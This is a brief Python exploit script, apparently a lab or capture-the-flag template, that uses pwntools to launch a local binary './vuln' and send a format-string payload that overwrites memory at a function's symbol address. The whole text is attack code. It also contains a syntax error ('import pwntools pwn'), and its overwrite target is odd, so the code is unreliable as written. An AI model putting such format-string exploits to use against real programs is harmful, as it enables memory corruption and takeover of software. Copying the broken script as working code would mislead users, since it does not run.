#!/usr/bin/env python3
import pwntools pwn
from pwn import *

p = process("./vuln")

fmt_addr = p.elf.symbols['vulnerable_function']
 
payload = fmtstr_payload(7, {fmt_addr: 0x1337})

p.sendlineafter("input:", payload)
output = p.recvall()
